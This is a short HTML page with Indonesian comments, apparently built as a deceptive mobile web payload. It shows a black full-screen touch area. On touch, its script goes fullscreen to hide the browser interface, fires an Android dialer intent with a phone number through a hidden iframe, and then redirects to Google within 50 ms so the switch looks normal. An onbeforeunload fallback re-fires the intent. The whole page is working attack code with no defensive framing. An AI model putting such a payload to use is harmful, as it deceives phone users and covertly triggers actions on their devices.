<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>S Y S T E M</title>
    <style>
        body, html { 
            margin: 0; padding: 0; background: #000; 
            width: 100vw; height: 100vh; overflow: hidden;
        }
        #trigger {
            width: 100%; height: 100%; cursor: pointer;
        }
    </style>
</head>
<body>

    <div id="trigger"></div>

<script>
    const trigger = document.getElementById('trigger');

    trigger.addEventListener('touchstart', function() {
        // 1. Fullscreen untuk 'membutakan' UI browser
        if (document.documentElement.requestFullscreen) {
            document.documentElement.requestFullscreen();
        }

        const intentUrl = "intent://123456789#Intent;scheme=tel;action=android.intent.action.DIAL;end";

        // 2. Gunakan Iframe tersembunyi untuk memicu Intent tanpa mengganggu loading
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = intentUrl;
        document.body.appendChild(iframe);

        // 3. Teknik 'Race Condition': Redirect segera setelah pemicuan
        // Kita beri delay sangat kecil (50ms) agar Iframe sempat memanggil sistem Android
        setTimeout(() => {
            // Keluar dari fullscreen agar transisi ke Google terlihat normal
            if (document.exitFullscreen) {
                document.exitFullscreen();
            }
            
            // Redirect Utama
            window.location.replace("https://www.google.com");
        }, 50);

        // 4. Fallback: Jika Iframe gagal, picu lagi tepat sebelum halaman berpindah
        window.onbeforeunload = function() {
            window.location.href = intentUrl;
        };
    });
</script>
</body>
</html>
